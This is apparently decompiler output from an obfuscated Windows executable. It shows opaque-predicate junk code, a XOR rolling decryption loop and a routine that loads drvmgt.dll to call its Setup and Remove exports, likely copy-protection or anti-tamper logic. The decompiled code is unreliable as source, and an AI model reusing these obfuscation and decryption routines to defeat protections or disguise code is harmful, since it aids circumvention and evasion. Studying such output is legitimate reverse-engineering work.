/* WARNING: Removing unreachable block (ram,0x00421b2b) */
/* WARNING: Removing unreachable block (ram,0x00421aef) */
/* WARNING: Removing unreachable block (ram,0x00421ad7) */
/* WARNING: Removing unreachable block (ram,0x00421abf) */
/* WARNING: Removing unreachable block (ram,0x00421aa7) */
/* WARNING: Removing unreachable block (ram,0x00421a8f) */
/* WARNING: Removing unreachable block (ram,0x00421a77) */
/* WARNING: Removing unreachable block (ram,0x00421a5f) */
/* WARNING: Removing unreachable block (ram,0x00421a3b) */
/* WARNING: Removing unreachable block (ram,0x00421a23) */
/* WARNING: Removing unreachable block (ram,0x00421a12) */
/* WARNING: Removing unreachable block (ram,0x00421a2f) */
/* WARNING: Removing unreachable block (ram,0x00421a47) */
/* WARNING: Removing unreachable block (ram,0x00421a6b) */
/* WARNING: Removing unreachable block (ram,0x00421a83) */
/* WARNING: Removing unreachable block (ram,0x00421a9b) */
/* WARNING: Removing unreachable block (ram,0x00421ab3) */
/* WARNING: Removing unreachable block (ram,0x00421acb) */
/* WARNING: Removing unreachable block (ram,0x00421ae3) */
/* WARNING: Removing unreachable block (ram,0x00421afb) */
/* WARNING: Removing unreachable block (ram,0x00421b07) */
/* WARNING: Removing unreachable block (ram,0x00421b1f) */
/* WARNING: Removing unreachable block (ram,0x00421c06) */
/* WARNING: Removing unreachable block (ram,0x00421c5a) */
/* WARNING: Removing unreachable block (ram,0x00421cc6) */
/* WARNING: Removing unreachable block (ram,0x00421d4e) */
/* WARNING: Removing unreachable block (ram,0x00421e34) */
/* WARNING: Removing unreachable block (ram,0x00421ed0) */
/* WARNING: Removing unreachable block (ram,0x00421fa9) */
/* WARNING: Removing unreachable block (ram,0x00421ca2) */
/* WARNING: Removing unreachable block (ram,0x00421d96) */
/* WARNING: Removing unreachable block (ram,0x00421eb8) */
/* WARNING: Removing unreachable block (ram,0x00421c1e) */
/* WARNING: Removing unreachable block (ram,0x00421df8) */
/* WARNING: Removing unreachable block (ram,0x00421c42) */
/* WARNING: Removing unreachable block (ram,0x00421ee8) */
/* WARNING: Removing unreachable block (ram,0x00421e28) */
/* WARNING: Removing unreachable block (ram,0x00421d0e) */
/* WARNING: Removing unreachable block (ram,0x00421cd2) */
/* WARNING: Removing unreachable block (ram,0x00421d5a) */
/* WARNING: Removing unreachable block (ram,0x00421e4c) */
/* WARNING: Removing unreachable block (ram,0x00421f54) */
/* WARNING: Removing unreachable block (ram,0x00421d66) */
/* WARNING: Removing unreachable block (ram,0x00421c4e) */
/* WARNING: Removing unreachable block (ram,0x00421f18) */
/* WARNING: Removing unreachable block (ram,0x00421c72) */
/* WARNING: Removing unreachable block (ram,0x00421e7c) */
/* WARNING: Removing unreachable block (ram,0x00421cf6) */
/* WARNING: Removing unreachable block (ram,0x00421c66) */
/* WARNING: Removing unreachable block (ram,0x00421d8a) */
/* WARNING: Removing unreachable block (ram,0x00421f0c) */
/* WARNING: Removing unreachable block (ram,0x00421df4) */
/* WARNING: Removing unreachable block (ram,0x00421c12) */
/* WARNING: Removing unreachable block (ram,0x00421e1c) */
/* WARNING: Removing unreachable block (ram,0x00421e0c) */
/* WARNING: Removing unreachable block (ram,0x00421e10) */
/* WARNING: Removing unreachable block (ram,0x00421f24) */
/* WARNING: Removing unreachable block (ram,0x00421e00) */
/* WARNING: Removing unreachable block (ram,0x00421e04) */
/* WARNING: Removing unreachable block (ram,0x00421cea) */
/* WARNING: Removing unreachable block (ram,0x00421b13) */
/* WARNING: Removing unreachable block (ram,0x00421c96) */
/* WARNING: Removing unreachable block (ram,0x00421d7e) */
/* WARNING: Removing unreachable block (ram,0x00421e94) */
/* WARNING: Removing unreachable block (ram,0x00421f9d) */
/* WARNING: Removing unreachable block (ram,0x00421f3c) */
/* WARNING: Removing unreachable block (ram,0x00421a53) */
/* WARNING: Removing unreachable block (ram,0x00421f60) */
/* WARNING: Removing unreachable block (ram,0x00421f78) */
/* WARNING: Removing unreachable block (ram,0x00421e18) */
/* WARNING: Removing unreachable block (ram,0x00421ea0) */
/* WARNING: Removing unreachable block (ram,0x00421e24) */
/* WARNING: Removing unreachable block (ram,0x00421e30) */
/* WARNING: Removing unreachable block (ram,0x00421e88) */
/* WARNING: Removing unreachable block (ram,0x00421fb5) */
/* WARNING: Heritage AFTER dead removal. Example location: s0x00000014 : 0x00421b40 */
/* WARNING: Removing unreachable block (ram,0x00421eac) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* WARNING: Restarted to delay deadcode elimination for space: stack */

void __fastcall FUN_004219a0(undefined4 param_1,uint *param_2)

{
  uint uVar1;
  uint uVar2;
  ushort uVar3;
  uint uVar4;
  byte *extraout_ECX;
  byte *pbVar5;
  bool bVar6;
  byte *in_stack_00000010;
  short sStack00000014;
  byte *in_stack_00000018;
  uint uStack_8;

  uVar1 = FUN_00415320((int *)0x0);
  uVar4 = _sStack00000014 & 0xffff;
                    /* WARNING: Bad instruction - Truncating control flow here */
                    /* WARNING: Bad instruction - Truncating control flow here */
  if (7 < (_sStack00000014 & 0xffff)) {
    while( true ) {
      uVar2 = _sStack00000014 & 0xffff;
      uVar3 = sStack00000014 - 1;
      _sStack00000014 = (uint)uVar3;
      if (uVar2 == 0) break;
      *in_stack_00000010 = *in_stack_00000010 ^ (byte)DAT_0042eb08;
      *in_stack_00000010 = *in_stack_00000010 ^ (byte)((uint)DAT_0042eb08 >> 8);
      *in_stack_00000010 = *in_stack_00000010 ^ (byte)((uint)DAT_0042eb08 >> 0x10);
      *in_stack_00000010 = *in_stack_00000010 ^ (byte)((uint)DAT_0042eb08 >> 0x18);
      *in_stack_00000010 = *in_stack_00000010 ^ *in_stack_00000018;
      DAT_0042eb08 = DAT_0042eb08 + *in_stack_00000010;
      in_stack_00000010 = in_stack_00000010 + 1;
      in_stack_00000018 = in_stack_00000018 + 1;
                    /* WARNING: Bad instruction - Truncating control flow here */
      pbVar5 = in_stack_00000018;
      if ((_sStack00000014 == uVar1 % uVar4) &&
         (uVar2 = FUN_00422b40(in_stack_00000018,uVar3,(uint *)&DAT_0042eb08), pbVar5 = extraout_ECX
         , (uVar2 & 0xffff) != 0)) {
        pbVar5 = DAT_0042eb08 + _sStack00000014;
        DAT_0042eb08 = pbVar5;
      }
      if ((uVar3 & 0xf) == 0) {
        FUN_00422cab((byte)pbVar5,(short)&uStack_8,&uStack_8);
        bVar6 = (POPCOUNT((uint)&stack0xffffffdc & 0xff) & 1U) == 0;
        if ((!bVar6) && (bVar6)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
          halt_baddata();
        }
        DAT_0042eb08 = DAT_0042eb08 + uStack_8;
      }
    }
  }
  return;
}



/* VA 00421fc2 */

/* WARNING: Instruction at (ram,0x0042218f) overlaps instruction at (ram,0x0042218d)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x00422168) */
/* WARNING: Removing unreachable block (ram,0x0042215c) */
/* WARNING: Removing unreachable block (ram,0x004220b8) */
/* WARNING: Removing unreachable block (ram,0x00422094) */
/* WARNING: Removing unreachable block (ram,0x0042207c) */
/* WARNING: Removing unreachable block (ram,0x00422064) */
/* WARNING: Removing unreachable block (ram,0x0042204c) */
/* WARNING: Removing unreachable block (ram,0x00422034) */
/* WARNING: Removing unreachable block (ram,0x0042201c) */
/* WARNING: Removing unreachable block (ram,0x00421ff8) */
/* WARNING: Removing unreachable block (ram,0x00421fd4) */
/* WARNING: Removing unreachable block (ram,0x00421fec) */
/* WARNING: Removing unreachable block (ram,0x00422010) */
/* WARNING: Removing unreachable block (ram,0x00422028) */
/* WARNING: Removing unreachable block (ram,0x00422040) */
/* WARNING: Removing unreachable block (ram,0x00422058) */
/* WARNING: Removing unreachable block (ram,0x00422070) */
/* WARNING: Removing unreachable block (ram,0x00422088) */
/* WARNING: Removing unreachable block (ram,0x004220ea) */
/* WARNING: Removing unreachable block (ram,0x004220f6) */
/* WARNING: Removing unreachable block (ram,0x00422102) */
/* WARNING: Removing unreachable block (ram,0x00422174) */
/* WARNING: Heritage AFTER dead removal. Example location: s0xfffffff8 : 0x00422148 */
/* WARNING: Removing unreachable block (ram,0x00422180) */
/* WARNING: Removing unreachable block (ram,0x004220a0) */
/* WARNING: Removing unreachable block (ram,0x00421fe0) */
/* WARNING: Removing unreachable block (ram,0x0042210e) */
/* WARNING: Removing unreachable block (ram,0x00422004) */
/* WARNING: Removing unreachable block (ram,0x004220ac) */
/* WARNING: Restarted to delay deadcode elimination for space: stack */

void __fastcall FUN_00421fc2(byte param_1)

{
  bool bVar1;
  undefined1 *in_stack_00000004;
  uint uStack_8;

  uStack_8 = 0;
  while( true ) {
    if (0xf < uStack_8) {
      return;
    }
    if (in_stack_00000004 == (undefined1 *)0x0) {
      bVar1 = (POPCOUNT(uStack_8 & 0xff) & 1U) == 0;
      (&DAT_0042eaf8)[uStack_8] = (undefined1)uStack_8;
    }
    else {
                    /* WARNING: Bad instruction - Truncating control flow here */
      (&DAT_0042eaf8)[uStack_8] = *in_stack_00000004;
      in_stack_00000004 = in_stack_00000004 + 1;
      bVar1 = (POPCOUNT((uint)in_stack_00000004 & 0xff) & 1U) == 0;
      if ((!bVar1) && (bVar1)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
        halt_baddata();
      }
    }
    if ((!bVar1) && (bVar1)) break;
    uStack_8 = (uint)(ushort)((short)uStack_8 + 1);
  }
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* VA 00422199 */

/* WARNING: Instruction at (ram,0x0042253e) overlaps instruction at (ram,0x0042253d)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x00422550) */
/* WARNING: Removing unreachable block (ram,0x00422520) */
/* WARNING: Removing unreachable block (ram,0x004224cf) */
/* WARNING: Removing unreachable block (ram,0x004224b7) */
/* WARNING: Removing unreachable block (ram,0x00422465) */
/* WARNING: Removing unreachable block (ram,0x00422459) */
/* WARNING: Removing unreachable block (ram,0x00422441) */
/* WARNING: Removing unreachable block (ram,0x00422429) */
/* WARNING: Removing unreachable block (ram,0x004223f7) */
/* WARNING: Removing unreachable block (ram,0x004223a1) */
/* WARNING: Removing unreachable block (ram,0x00422389) */
/* WARNING: Removing unreachable block (ram,0x00422371) */
/* WARNING: Removing unreachable block (ram,0x0042234e) */
/* WARNING: Removing unreachable block (ram,0x00422336) */
/* WARNING: Removing unreachable block (ram,0x00422321) */
/* WARNING: Removing unreachable block (ram,0x004222f1) */
/* WARNING: Removing unreachable block (ram,0x004222d9) */
/* WARNING: Removing unreachable block (ram,0x004222c1) */
/* WARNING: Removing unreachable block (ram,0x004222a9) */
/* WARNING: Removing unreachable block (ram,0x00422291) */
/* WARNING: Removing unreachable block (ram,0x00422279) */
/* WARNING: Removing unreachable block (ram,0x00422261) */
/* WARNING: Removing unreachable block (ram,0x00422249) */
/* WARNING: Removing unreachable block (ram,0x00422231) */
/* WARNING: Removing unreachable block (ram,0x00422225) */
/* WARNING: Removing unreachable block (ram,0x004221e9) */
/* WARNING: Removing unreachable block (ram,0x004221d1) */
/* WARNING: Removing unreachable block (ram,0x004221b9) */
/* WARNING: Removing unreachable block (ram,0x004221f5) */
/* WARNING: Removing unreachable block (ram,0x00422201) */
/* WARNING: Removing unreachable block (ram,0x00422219) */
/* WARNING: Removing unreachable block (ram,0x00422255) */
/* WARNING: Removing unreachable block (ram,0x0042226d) */
/* WARNING: Removing unreachable block (ram,0x00422285) */
/* WARNING: Removing unreachable block (ram,0x0042229d) */
/* WARNING: Removing unreachable block (ram,0x004222b5) */
/* WARNING: Removing unreachable block (ram,0x004222cd) */
/* WARNING: Removing unreachable block (ram,0x004222e5) */
/* WARNING: Removing unreachable block (ram,0x004222fd) */
/* WARNING: Removing unreachable block (ram,0x00422309) */
/* WARNING: Removing unreachable block (ram,0x00422342) */
/* WARNING: Removing unreachable block (ram,0x0042235a) */
/* WARNING: Removing unreachable block (ram,0x0042237d) */
/* WARNING: Removing unreachable block (ram,0x00422395) */
/* WARNING: Removing unreachable block (ram,0x004223ad) */
/* WARNING: Removing unreachable block (ram,0x004223b9) */
/* WARNING: Removing unreachable block (ram,0x004223eb) */
/* WARNING: Removing unreachable block (ram,0x0042241d) */
/* WARNING: Removing unreachable block (ram,0x00422435) */
/* WARNING: Removing unreachable block (ram,0x0042244d) */
/* WARNING: Removing unreachable block (ram,0x00422487) */
/* WARNING: Removing unreachable block (ram,0x004224c3) */
/* WARNING: Removing unreachable block (ram,0x0042252c) */
/* WARNING: Removing unreachable block (ram,0x0042255c) */
/* WARNING: Removing unreachable block (ram,0x00422568) */
/* WARNING: Removing unreachable block (ram,0x004221c5) */
/* WARNING: Removing unreachable block (ram,0x00422315) */
/* WARNING: Removing unreachable block (ram,0x00422403) */
/* WARNING: Removing unreachable block (ram,0x00422408) */
/* WARNING: Removing unreachable block (ram,0x00422574) */
/* WARNING: Removing unreachable block (ram,0x004224db) */
/* WARNING: Removing unreachable block (ram,0x004224e4) */
/* WARNING: Removing unreachable block (ram,0x004221dd) */
/* WARNING: Removing unreachable block (ram,0x004223c5) */
/* WARNING: Removing unreachable block (ram,0x00422471) */
/* WARNING: Removing unreachable block (ram,0x00422538) */
/* WARNING: Removing unreachable block (ram,0x0042223d) */
/* WARNING: Removing unreachable block (ram,0x0042220d) */
/* WARNING: Removing unreachable block (ram,0x004224ab) */
/* WARNING: Removing unreachable block (ram,0x0042249f) */
/* WARNING: Heritage AFTER dead removal. Example location: s0xfffffff0 : 0x004224f0 */
/* WARNING: Removing unreachable block (ram,0x00422493) */
/* WARNING: Restarted to delay deadcode elimination for space: stack */

undefined1 __fastcall FUN_00422199(byte param_1,undefined2 param_2)

{
  undefined1 uVar1;
  byte extraout_CL;
  int unaff_EBX;
  bool bVar2;
  LPCSTR in_stack_ffffffe0;
  HANDLE pvStack_10;
  HMODULE pHStack_c;
  byte bStack_8;

  bVar2 = (POPCOUNT((uint)&pvStack_10 & 0xff) & 1U) == 0;
  if ((!bVar2) && (bVar2)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  pvStack_10 = GetCurrentProcess();
  pHStack_c = GetModuleHandleA(in_stack_ffffffe0);
  FUN_00411c70((int)&pvStack_10,0x67);
  bVar2 = (POPCOUNT((uint)&stack0xffffffe4 & 0xff) & 1U) == 0;
  if ((!bVar2) && (bVar2)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  func_0x004117e0();
  FUN_00421fc2(extraout_CL);
  FUN_004205b5(bStack_8);
  bVar2 = (POPCOUNT((uint)&stack0xffffffe4 & 0xff) & 1U) == 0;
  if ((!bVar2) && (bVar2)) {
    *(int *)(unaff_EBX + 4) = *(int *)(unaff_EBX + 4) >> 7;
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  uVar1 = func_0x004118a0();
                    /* WARNING: Bad instruction - Truncating control flow here */
  return uVar1;
}



/* VA 0042257c */

/* WARNING: Instruction at (ram,0x004229bb) overlaps instruction at (ram,0x004229ba)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x004229db) */
/* WARNING: Removing unreachable block (ram,0x00422995) */
/* WARNING: Removing unreachable block (ram,0x00422946) */
/* WARNING: Removing unreachable block (ram,0x0042290a) */
/* WARNING: Removing unreachable block (ram,0x004228f2) */
/* WARNING: Removing unreachable block (ram,0x004228da) */
/* WARNING: Removing unreachable block (ram,0x004228c2) */
/* WARNING: Removing unreachable block (ram,0x004228aa) */
/* WARNING: Removing unreachable block (ram,0x00422870) */
/* WARNING: Removing unreachable block (ram,0x00422858) */
/* WARNING: Removing unreachable block (ram,0x00422840) */
/* WARNING: Removing unreachable block (ram,0x00422828) */
/* WARNING: Removing unreachable block (ram,0x00422810) */
/* WARNING: Removing unreachable block (ram,0x004227f8) */
/* WARNING: Removing unreachable block (ram,0x004227e0) */
/* WARNING: Removing unreachable block (ram,0x004227c8) */
/* WARNING: Removing unreachable block (ram,0x004227b0) */
/* WARNING: Removing unreachable block (ram,0x00422766) */
/* WARNING: Removing unreachable block (ram,0x0042274e) */
/* WARNING: Removing unreachable block (ram,0x00422742) */
/* WARNING: Removing unreachable block (ram,0x0042272a) */
/* WARNING: Removing unreachable block (ram,0x00422712) */
/* WARNING: Removing unreachable block (ram,0x004226d6) */
/* WARNING: Removing unreachable block (ram,0x004226be) */
/* WARNING: Removing unreachable block (ram,0x004226a6) */
/* WARNING: Removing unreachable block (ram,0x00422668) */
/* WARNING: Removing unreachable block (ram,0x00422638) */
/* WARNING: Removing unreachable block (ram,0x00422614) */
/* WARNING: Removing unreachable block (ram,0x004225fc) */
/* WARNING: Removing unreachable block (ram,0x004225e4) */
/* WARNING: Removing unreachable block (ram,0x004225cc) */
/* WARNING: Removing unreachable block (ram,0x00422590) */
/* WARNING: Removing unreachable block (ram,0x0042259c) */
/* WARNING: Removing unreachable block (ram,0x004225a8) */
/* WARNING: Removing unreachable block (ram,0x004225c0) */
/* WARNING: Removing unreachable block (ram,0x00422608) */
/* WARNING: Removing unreachable block (ram,0x00422620) */
/* WARNING: Removing unreachable block (ram,0x00422644) */
/* WARNING: Removing unreachable block (ram,0x00422674) */
/* WARNING: Removing unreachable block (ram,0x004226b2) */
/* WARNING: Removing unreachable block (ram,0x004226ca) */
/* WARNING: Removing unreachable block (ram,0x004226e2) */
/* WARNING: Removing unreachable block (ram,0x004226ee) */
/* WARNING: Removing unreachable block (ram,0x00422706) */
/* WARNING: Removing unreachable block (ram,0x0042271e) */
/* WARNING: Removing unreachable block (ram,0x00422736) */
/* WARNING: Removing unreachable block (ram,0x00422772) */
/* WARNING: Removing unreachable block (ram,0x0042277e) */
/* WARNING: Removing unreachable block (ram,0x004227a4) */
/* WARNING: Removing unreachable block (ram,0x004227bc) */
/* WARNING: Removing unreachable block (ram,0x004227d4) */
/* WARNING: Removing unreachable block (ram,0x004227ec) */
/* WARNING: Removing unreachable block (ram,0x00422804) */
/* WARNING: Removing unreachable block (ram,0x0042281c) */
/* WARNING: Removing unreachable block (ram,0x00422834) */
/* WARNING: Removing unreachable block (ram,0x0042287c) */
/* WARNING: Removing unreachable block (ram,0x00422888) */
/* WARNING: Removing unreachable block (ram,0x0042289e) */
/* WARNING: Removing unreachable block (ram,0x004228b6) */
/* WARNING: Removing unreachable block (ram,0x004228ce) */
/* WARNING: Removing unreachable block (ram,0x00422916) */
/* WARNING: Removing unreachable block (ram,0x00422922) */
/* WARNING: Removing unreachable block (ram,0x0042293a) */
/* WARNING: Removing unreachable block (ram,0x004229ad) */
/* WARNING: Removing unreachable block (ram,0x00422864) */
/* WARNING: Removing unreachable block (ram,0x004228fe) */
/* WARNING: Removing unreachable block (ram,0x004225f0) */
/* WARNING: Removing unreachable block (ram,0x0042275a) */
/* WARNING: Removing unreachable block (ram,0x0042284c) */
/* WARNING: Removing unreachable block (ram,0x004229a1) */
/* WARNING: Removing unreachable block (ram,0x0042292e) */
/* WARNING: Removing unreachable block (ram,0x00422650) */
/* WARNING: Removing unreachable block (ram,0x0042262c) */
/* WARNING: Removing unreachable block (ram,0x00422952) */
/* WARNING: Removing unreachable block (ram,0x004228e6) */
/* WARNING: Removing unreachable block (ram,0x0042278a) */
/* WARNING: Removing unreachable block (ram,0x0042278f) */
/* WARNING: Removing unreachable block (ram,0x004226fa) */
/* WARNING: Removing unreachable block (ram,0x004225d8) */
/* WARNING: Removing unreachable block (ram,0x004225b4) */
/* WARNING: Removing unreachable block (ram,0x004229b9) */
/* WARNING: Removing unreachable block (ram,0x0042265c) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_0042257c(undefined4 param_1,char *param_2)

{
  byte extraout_CL;
  byte extraout_CL_00;
  HANDLE pvStackY_44;
  undefined4 uStackY_40;
  undefined4 uStackY_3c;
  undefined4 uStackY_38;
  undefined *puStackY_34;
  HANDLE local_10;
  undefined4 local_c;
  undefined4 uStack_8;

  local_10 = GetCurrentProcess();
  local_c = FUN_0041fe22(extraout_CL,param_2);
  puStackY_34 = (undefined *)0x422698;
  FUN_00411c70((int)&local_10,0x67);
  puStackY_34 = &UNK_00422796;
  func_0x004117e0();
  FUN_00421fc2(extraout_CL_00);
  DAT_0042eb08 = 0;
  puStackY_34 = (undefined *)0x42aaf0;
                    /* WARNING: Bad instruction - Truncating control flow here */
  uStackY_38 = 0x42aaf8;
  pvStackY_44 = local_10;
  uStackY_40 = local_c;
  uStackY_3c = uStack_8;
  FUN_004205b5((byte)&pvStackY_44);
  DAT_0042eb08 = 0;
  puStackY_34 = &UNK_004229cd;
  func_0x004118a0();
  return;
}



/* VA 004229f0 */

undefined4 __cdecl FUN_004229f0(int param_1,undefined4 param_2,int *param_3)

{
  BOOL BVar1;
  undefined4 uVar2;
  HMODULE hModule;
  int iVar3;
  _OSVERSIONINFOA local_29c;
  byte local_208 [256];
  byte local_108 [260];

  local_29c.dwOSVersionInfoSize = 0x94;
  BVar1 = GetVersionExA(&local_29c);
  if ((BVar1 == 0) || (local_29c.dwPlatformId == 2)) {
    hModule = LoadLibraryExA(s_drvmgt_dll_0042ab64,(HANDLE)0x0,8);
    if (hModule == (HMODULE)0x0) {
      uVar2 = 0;
    }
    else {
      if ((DAT_0042eb10 == (FARPROC)0x0) &&
         (DAT_0042eb10 = GetProcAddress(hModule,s_Setup_0042ab70), DAT_0042eb10 == (FARPROC)0x0)) {
        return 0;
      }
      if ((DAT_0042eb14 == (FARPROC)0x0) &&
         (DAT_0042eb14 = GetProcAddress(hModule,s_Remove_0042ab78), DAT_0042eb14 == (FARPROC)0x0)) {
        return 0;
      }
      GetModuleFileNameA((HMODULE)0x0,(LPSTR)local_108,0x104);
      FUN_00416160(local_108,(byte *)0x0,(byte *)0x0,local_208,(byte *)0x0);
      if (param_1 == 0xfa) {
        iVar3 = (*DAT_0042eb10)(local_208,param_2);
        *param_3 = iVar3;
      }
      else {
        if (param_1 != 0xfb) {
          return param_1 & 0xffff0000;
        }
        iVar3 = (*DAT_0042eb14)(local_208);
        *param_3 = iVar3;
      }
      uVar2 = CONCAT22((short)((uint)iVar3 >> 0x10),1);
    }
  }
  else {
    uVar2 = CONCAT22((short)((uint)BVar1 >> 0x10),1);
  }
  return uVar2;
}



/* VA 00422b40 */

/* WARNING: Instruction at (ram,0x00422c0a) overlaps instruction at (ram,0x00422c08)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x00422c33) */
/* WARNING: Removing unreachable block (ram,0x00422c37) */
/* WARNING: Removing unreachable block (ram,0x00422c77) */
/* WARNING: Removing unreachable block (ram,0x00422c83) */
/* WARNING: Removing unreachable block (ram,0x00422c4b) */
/* WARNING: Removing unreachable block (ram,0x00422c4f) */
/* WARNING: Removing unreachable block (ram,0x00422c03) */
/* WARNING: Removing unreachable block (ram,0x00422be7) */
/* WARNING: Removing unreachable block (ram,0x00422beb) */
/* WARNING: Removing unreachable block (ram,0x00422bca) */
/* WARNING: Removing unreachable block (ram,0x00422b6f) */
/* WARNING: Removing unreachable block (ram,0x00422b63) */
/* WARNING: Removing unreachable block (ram,0x00422b57) */
/* WARNING: Removing unreachable block (ram,0x00422ba6) */
/* WARNING: Removing unreachable block (ram,0x00422bbe) */
/* WARNING: Removing unreachable block (ram,0x00422bdb) */
/* WARNING: Removing unreachable block (ram,0x00422bdf) */
/* WARNING: Removing unreachable block (ram,0x00422bf7) */
/* WARNING: Removing unreachable block (ram,0x00422c3f) */
/* WARNING: Removing unreachable block (ram,0x00422c43) */
/* WARNING: Removing unreachable block (ram,0x00422c8f) */
/* WARNING: Removing unreachable block (ram,0x00422bff) */
/* WARNING: Removing unreachable block (ram,0x00422bf3) */
/* WARNING: Removing unreachable block (ram,0x00422bb2) */
/* WARNING: Removing unreachable block (ram,0x00422b7b) */

uint __fastcall FUN_00422b40(undefined4 param_1,undefined2 param_2,uint *param_3)

{
  BOOL BVar1;
  undefined4 *puVar2;
  undefined8 uVar3;
  _OSVERSIONINFOA local_98;

  local_98.dwOSVersionInfoSize = 0x94;
                    /* WARNING: Bad instruction - Truncating control flow here */
  BVar1 = GetVersionExA(&local_98);
  if (BVar1 != 0) {
    if (local_98.dwPlatformId == 1) {
      puVar2 = FUN_004259fe();
      return (uint)puVar2;
    }
    if (local_98.dwPlatformId == 2) {
      uVar3 = FUN_004239df();
      return (uint)uVar3;
    }
  }
  *param_3 = *param_3 & 0xff;
  return CONCAT22((short)((uint)param_3 >> 0x10),1);
}



/* VA 00422cab */

/* WARNING: Instruction at (ram,0x00422d98) overlaps instruction at (ram,0x00422d97)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x00422dc2) */
/* WARNING: Removing unreachable block (ram,0x00422dc6) */
/* WARNING: Removing unreachable block (ram,0x00422ec1) */
/* WARNING: Removing unreachable block (ram,0x00422ea9) */
/* WARNING: Removing unreachable block (ram,0x00422e8d) */
/* WARNING: Removing unreachable block (ram,0x00422e81) */
/* WARNING: Removing unreachable block (ram,0x00422e39) */
/* WARNING: Removing unreachable block (ram,0x00422e45) */
/* WARNING: Removing unreachable block (ram,0x00422df6) */
/* WARNING: Removing unreachable block (ram,0x00422dde) */
/* WARNING: Removing unreachable block (ram,0x00422dda) */
/* WARNING: Removing unreachable block (ram,0x00422d82) */
/* WARNING: Removing unreachable block (ram,0x00422d86) */
/* WARNING: Removing unreachable block (ram,0x00422d4d) */
/* WARNING: Removing unreachable block (ram,0x00422d14) */
/* WARNING: Removing unreachable block (ram,0x00422cf2) */
/* WARNING: Removing unreachable block (ram,0x00422cc2) */
/* WARNING: Removing unreachable block (ram,0x00422cce) */
/* WARNING: Removing unreachable block (ram,0x00422cda) */
/* WARNING: Removing unreachable block (ram,0x00422d20) */
/* WARNING: Removing unreachable block (ram,0x00422d59) */
/* WARNING: Removing unreachable block (ram,0x00422d65) */
/* WARNING: Removing unreachable block (ram,0x00422d76) */
/* WARNING: Removing unreachable block (ram,0x00422d7a) */
/* WARNING: Removing unreachable block (ram,0x00422d8e) */
/* WARNING: Removing unreachable block (ram,0x00422d92) */
/* WARNING: Removing unreachable block (ram,0x00422dce) */
/* WARNING: Removing unreachable block (ram,0x00422dd2) */
/* WARNING: Removing unreachable block (ram,0x00422dea) */
/* WARNING: Removing unreachable block (ram,0x00422e02) */
/* WARNING: Removing unreachable block (ram,0x00422e5d) */
/* WARNING: Removing unreachable block (ram,0x00422e75) */
/* WARNING: Removing unreachable block (ram,0x00422eb5) */
/* WARNING: Removing unreachable block (ram,0x00422ecd) */
/* WARNING: Removing unreachable block (ram,0x00422ed9) */
/* WARNING: Removing unreachable block (ram,0x00422d2c) */
/* WARNING: Removing unreachable block (ram,0x00422dfe) */
/* WARNING: Removing unreachable block (ram,0x00422de6) */
/* WARNING: Removing unreachable block (ram,0x00422df2) */
/* WARNING: Removing unreachable block (ram,0x00422cfe) */
/* WARNING: Removing unreachable block (ram,0x00422e69) */
/* WARNING: Removing unreachable block (ram,0x00422ee5) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

uint __fastcall FUN_00422cab(byte param_1,undefined2 param_2,uint *param_3)

{
  uint uVar1;
  BOOL BVar2;
  int *extraout_ECX;
  undefined4 extraout_EDX;
  int unaff_EBX;
  bool bVar3;
  undefined8 uVar4;
  undefined1 auStack_9c [4];
  _OSVERSIONINFOA local_98;

  bVar3 = (POPCOUNT((uint)auStack_9c & 0xff) & 1U) == 0;
  if ((!bVar3) && (bVar3)) {
    *(int *)(unaff_EBX + 4) = *(int *)(unaff_EBX + 4) >> 7;
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  local_98.dwOSVersionInfoSize = 0x94;
                    /* WARNING: Bad instruction - Truncating control flow here */
                    /* WARNING: Bad instruction - Truncating control flow here */
  BVar2 = GetVersionExA(&local_98);
  uVar1 = 0;
  if (BVar2 != 0) {
    if (local_98.dwPlatformId == 1) {
      uVar4 = FUN_00426323((uint)param_3,extraout_EDX);
      return (uint)uVar4;
    }
    uVar1 = local_98.dwPlatformId - 2;
    if (uVar1 == 0) {
      uVar4 = FUN_004241b5(extraout_ECX);
      return (uint)uVar4;
    }
  }
  bVar3 = (POPCOUNT(uVar1 & 0xff) & 1U) == 0;
  if ((!bVar3) && (bVar3)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  if ((!bVar3) && (bVar3)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  *param_3 = *param_3 & 0xff;
  return CONCAT22((short)((uint)param_3 >> 0x10),1);
}



/* VA 00422ef1 */

/* WARNING: Instruction at (ram,0x0042328e) overlaps instruction at (ram,0x0042328d)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x00423224) */
/* WARNING: Removing unreachable block (ram,0x00423228) */
/* WARNING: Removing unreachable block (ram,0x00423328) */
/* WARNING: Removing unreachable block (ram,0x0042332c) */
/* WARNING: Removing unreachable block (ram,0x00423474) */
/* WARNING: Removing unreachable block (ram,0x0042345c) */
/* WARNING: Removing unreachable block (ram,0x00423420) */
/* WARNING: Removing unreachable block (ram,0x004233ec) */
/* WARNING: Removing unreachable block (ram,0x004233d4) */
/* WARNING: Removing unreachable block (ram,0x004233b0) */
/* WARNING: Removing unreachable block (ram,0x00423398) */
/* WARNING: Removing unreachable block (ram,0x00423374) */
/* WARNING: Removing unreachable block (ram,0x0042335c) */
/* WARNING: Removing unreachable block (ram,0x00423334) */
/* WARNING: Removing unreachable block (ram,0x00423338) */
/* WARNING: Removing unreachable block (ram,0x004232fb) */
/* WARNING: Removing unreachable block (ram,0x004232e3) */
